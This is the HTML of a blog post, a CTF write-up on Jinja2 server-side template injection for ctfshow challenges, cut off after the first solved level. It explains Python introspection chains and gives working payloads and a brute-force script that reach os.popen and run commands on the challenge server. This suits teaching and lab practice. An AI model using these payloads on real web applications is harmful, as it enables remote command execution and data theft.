@@ -1,0 +1,1524 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>ctfshow_ssti - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="ctfshow_ssti" />
+<meta property="og:description" content="ctfshow ssti漏洞专题
+python jinja2" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/ctfshow_ssti/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-08T00:00:00+08:00" />
+<meta property="article:modified_time" content="2024-02-08T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="ctfshow_ssti"/>
+<meta name="twitter:description" content="ctfshow ssti漏洞专题
+python jinja2"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/ctfshow_ssti/" /><link rel="prev" href="http://scofield1920.github.io/docker_gzctf/" /><link rel="next" href="http://scofield1920.github.io/zkssb4/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "ctfshow_ssti",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/ctfshow_ssti\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "CTF, web","wordcount":  1220 ,
+        "url": "http:\/\/scofield1920.github.io\/ctfshow_ssti\/","datePublished": "2024-02-08T00:00:00+08:00","dateModified": "2024-02-08T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#先抄抄笔记">先抄抄笔记</a>
+      <ul>
+        <li><a href="#代码块">代码块</a></li>
+        <li><a href="#常用方法">常用方法</a></li>
+        <li><a href="#ssti-jinja2执行命令">SSTI-jinja2执行命令</a></li>
+        <li><a href="#一般注入流程">一般注入流程</a></li>
+      </ul>
+    </li>
+    <li><a href="#靶场题目">靶场题目</a>
+      <ul>
+        <li><a href="#web361无过滤">[web361]无过滤</a></li>
+        <li><a href="#web362过滤数字">[web362]过滤数字</a></li>
+        <li><a href="#web363过滤单双引号">[web363]过滤单双引号</a></li>
+        <li><a href="#web364过滤args">[web364]过滤args</a></li>
+        <li><a href="#web365过滤args">[web365]过滤&rsquo;&rsquo;、&quot;&quot;、[、args</a></li>
+        <li><a href="#web366过滤args_">[web366]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_</a></li>
+        <li><a href="#web367过滤args_os">[web367]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os</a></li>
+        <li><a href="#web368过滤args_os">[web368]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{</a></li>
+        <li><a href="#web369过滤args_osrequest">[web369]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request</a>
+          <ul>
+            <li><a href="#payload1读取flag文件">payload1：读取<code>/flag</code>文件：</a></li>
+            <li><a href="#payload2执行命令cat-flag">payload2：执行命令<code>cat /flag</code></a></li>
+            <li><a href="#payload3执行命令cat-flag">payload3：执行命令<code>cat /flag</code></a></li>
+          </ul>
+        </li>
+        <li><a href="#web370过滤args_osrequest数字">[web370]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request、数字</a>
+          <ul>
+            <li><a href="#payload1全角数字绕过">payload1：全角数字绕过</a></li>
+            <li><a href="#payload2构造数字">payload2：构造数字</a></li>
+            <li><a href="#payload3index构造数字">payload3：index构造数字</a></li>
+            <li><a href="#payload4反弹shell">payload4：反弹shell</a></li>
+          </ul>
+        </li>
+        <li><a href="#web371过滤args_osrequest数字print">[web371]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request、数字、{%print</a>
+          <ul>
+            <li><a href="#payload1web370反弹shell">payload1：web370反弹shell</a></li>
+            <li><a href="#payload2payload固定里面的一部分cmd用脚本生成">payload2：payload固定，里面的一部分<code>cmd</code>用脚本生成</a></li>
+          </ul>
+        </li>
+        <li><a href="#web372过滤args_osrequest数字printcount">[web372]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request、数字、{%print、count</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ctfshow_ssti</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-08">2024-02-08</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-08">2024-02-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1220 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#先抄抄笔记">先抄抄笔记</a>
+      <ul>
+        <li><a href="#代码块">代码块</a></li>
+        <li><a href="#常用方法">常用方法</a></li>
+        <li><a href="#ssti-jinja2执行命令">SSTI-jinja2执行命令</a></li>
+        <li><a href="#一般注入流程">一般注入流程</a></li>
+      </ul>
+    </li>
+    <li><a href="#靶场题目">靶场题目</a>
+      <ul>
+        <li><a href="#web361无过滤">[web361]无过滤</a></li>
+        <li><a href="#web362过滤数字">[web362]过滤数字</a></li>
+        <li><a href="#web363过滤单双引号">[web363]过滤单双引号</a></li>
+        <li><a href="#web364过滤args">[web364]过滤args</a></li>
+        <li><a href="#web365过滤args">[web365]过滤&rsquo;&rsquo;、&quot;&quot;、[、args</a></li>
+        <li><a href="#web366过滤args_">[web366]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_</a></li>
+        <li><a href="#web367过滤args_os">[web367]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os</a></li>
+        <li><a href="#web368过滤args_os">[web368]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{</a></li>
+        <li><a href="#web369过滤args_osrequest">[web369]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request</a>
+          <ul>
+            <li><a href="#payload1读取flag文件">payload1：读取<code>/flag</code>文件：</a></li>
+            <li><a href="#payload2执行命令cat-flag">payload2：执行命令<code>cat /flag</code></a></li>
+            <li><a href="#payload3执行命令cat-flag">payload3：执行命令<code>cat /flag</code></a></li>
+          </ul>
+        </li>
+        <li><a href="#web370过滤args_osrequest数字">[web370]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request、数字</a>
+          <ul>
+            <li><a href="#payload1全角数字绕过">payload1：全角数字绕过</a></li>
+            <li><a href="#payload2构造数字">payload2：构造数字</a></li>
+            <li><a href="#payload3index构造数字">payload3：index构造数字</a></li>
+            <li><a href="#payload4反弹shell">payload4：反弹shell</a></li>
+          </ul>
+        </li>
+        <li><a href="#web371过滤args_osrequest数字print">[web371]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request、数字、{%print</a>
+          <ul>
+            <li><a href="#payload1web370反弹shell">payload1：web370反弹shell</a></li>
+            <li><a href="#payload2payload固定里面的一部分cmd用脚本生成">payload2：payload固定，里面的一部分<code>cmd</code>用脚本生成</a></li>
+          </ul>
+        </li>
+        <li><a href="#web372过滤args_osrequest数字printcount">[web372]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request、数字、{%print、count</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>ctfshow ssti漏洞专题</p>
+<p>python jinja2</p>
+<p>ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入</p>
+<h2 id="先抄抄笔记" class="headerLink">
+    <a href="#%e5%85%88%e6%8a%84%e6%8a%84%e7%ac%94%e8%ae%b0" class="header-mark"></a>先抄抄笔记</h2><h3 id="代码块" class="headerLink">
+    <a href="#%e4%bb%a3%e7%a0%81%e5%9d%97" class="header-mark"></a>代码块</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">变量块 {{}}  用于将表达式打印到模板输出
+</span></span><span class="line"><span class="cl">注释块 {##}  注释
+</span></span><span class="line"><span class="cl">控制块 {%%}  可以声明变量，也可以执行语句
+</span></span><span class="line"><span class="cl">{% for i in &#39;&#39;.__class__.__mro__[1].__subclasses__() %}{% if i.__name__==&#39;_wrap_close&#39; %}{% print i.__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read() %}{% endif %}{% endfor %}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">行声明 ##    可以有和{%%}相同的效果
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="常用方法" class="headerLink">
+    <a href="#%e5%b8%b8%e7%94%a8%e6%96%b9%e6%b3%95" class="header-mark"></a>常用方法</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python的str(字符串)、dict(字典)、tuple(元组)、list(列表)这些在Python类结构的基类都是object，而object拥有众多的子类。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[].__class__：列表 
+</span></span><span class="line"><span class="cl">&#39;&#39;.__class__ ：字符串
+</span></span><span class="line"><span class="cl">().__class__ ：元组
+</span></span><span class="line"><span class="cl">{}.__class__：字典
+</span></span><span class="line"><span class="cl">------------------------------------------------------------
+</span></span><span class="line"><span class="cl">有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（&lt;class&#39;object&#39;&gt;）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">__class__ ：类的一个内置属性，查看实例对象的类。 
+</span></span><span class="line"><span class="cl">__base__ ：类型对象的直接基类 
+</span></span><span class="line"><span class="cl">__bases__ ：类型对象的全部基类（直接父类），以元组形式（只有一个元素），类型的实例通常没有属性 __bases__ 
+</span></span><span class="line"><span class="cl">__mro__ ：可以用来获取一个类的调用顺序，元组形式，返回如(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)。__mro__[1]就是object
+</span></span><span class="line"><span class="cl">------------------------------------------------------------
+</span></span><span class="line"><span class="cl">__subclasses__()：返回这个类的所有子类，列表形式。
+</span></span><span class="line"><span class="cl">__builtins__：内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。返回内建内建名称空间字典__builtins__与__builtin__的区别就不放了，百度都有。 （做为默认初始模块出现的，可用于查看当前所有导入的内建函数。，集合形式）
+</span></span><span class="line"><span class="cl">__init__：初始化类，返回的类型是function，可以用来跳到__globals__。
+</span></span><span class="line"><span class="cl">__globals__：会以字典的形式返回当前位置的所有全局变量，与 func_globals  等价。
+</span></span><span class="line"><span class="cl">__import__：动态加载类和函数，也就是导入模块，经常用于导入os模块，语法：__import__(模块名)。如：__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()
+</span></span><span class="line"><span class="cl">------------------------------------------------------------
+</span></span><span class="line"><span class="cl">__dic__ ：类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里 
+</span></span><span class="line"><span class="cl">__getattribute__()：实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。 
+</span></span><span class="line"><span class="cl">__getitem__()：调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;) 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ssti-jinja2执行命令" class="headerLink">
+    <a href="#ssti-jinja2%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4" class="header-mark"></a>SSTI-jinja2执行命令</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">内建函数 eval 执行命令
+</span></span><span class="line"><span class="cl">os 模块执行命令
+</span></span><span class="line"><span class="cl">popen 函数执行命令
+</span></span><span class="line"><span class="cl">importlib 类执行命令
+</span></span><span class="line"><span class="cl">linecache 函数执行命令
+</span></span><span class="line"><span class="cl">subprocess.Popen 类执行命令
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="一般注入流程" class="headerLink">
+    <a href="#%e4%b8%80%e8%88%ac%e6%b3%a8%e5%85%a5%e6%b5%81%e7%a8%8b" class="header-mark"></a>一般注入流程</h3><p>在检测到存在SSTI模板注入漏洞之后-&gt;获得内置类所对应的类-&gt;获得object基类-&gt;获得所有子类-&gt;获得可以执行shell命令的子类-&gt;找到该子类可以执行shell命令的方法-&gt;执行shell命令</p>
+<h2 id="靶场题目" class="headerLink">
+    <a href="#%e9%9d%b6%e5%9c%ba%e9%a2%98%e7%9b%ae" class="header-mark"></a>靶场题目</h2><h3 id="web361无过滤" class="headerLink">
+    <a href="#web361%e6%97%a0%e8%bf%87%e6%bb%a4" class="header-mark"></a>[web361]无过滤</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{7*7}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回显49，存在ssti注入漏洞</p>
+<p>获得内置类所对应的类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{&#39;&#39;.__class__}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获得object基类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{&#39;&#39;.__class__.__base__}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获得所有子类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{&#39;&#39;.__class__.__base__.__subclasses__()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225123753296.png" title="image-20240225123753296" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225123753296.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225123753296.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225123753296.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225123753296.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225123753296.png 2x"
+            sizes="auto"
+            alt="image-20240225123753296">
+    </a></figure></p>
+<p>通过python脚本判断可以执行shell命令子类的索引值</p>
+<p>以子类是否存在popen方法为例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://53e07393-3341-47a7-b048-e4773c51a22c.challenge.ctf.show/?name={{&#39;&#39;.__class__.__base__.__subclasses__()[&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;].__init__.__globals__[&#39;popen&#39;]}}&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;popen&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134714423.png" title="image-20240225134714423" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134714423.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134714423.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134714423.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134714423.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134714423.png 2x"
+            sizes="auto"
+            alt="image-20240225134714423">
+    </a></figure></p>
+<p>执行shell命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://53e07393-3341-47a7-b048-e4773c51a22c.challenge.ctf.show/?name={{&#39;&#39;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls /&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134927105.png" title="image-20240225134927105" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134927105.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134927105.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134927105.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134927105.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225134927105.png 2x"
+            sizes="auto"
+            alt="image-20240225134927105">
+    </a></figure></p>
+<p>读取flag文件</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225135000860.png" title="image-20240225135000860" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225135000860.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225135000860.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225135000860.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225135000860.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240225135000860.png 2x"
+            sizes="auto"
+            alt="image-20240225135000860">
+    </a></figure></p>
+<h3 id="web362过滤数字" class="headerLink">
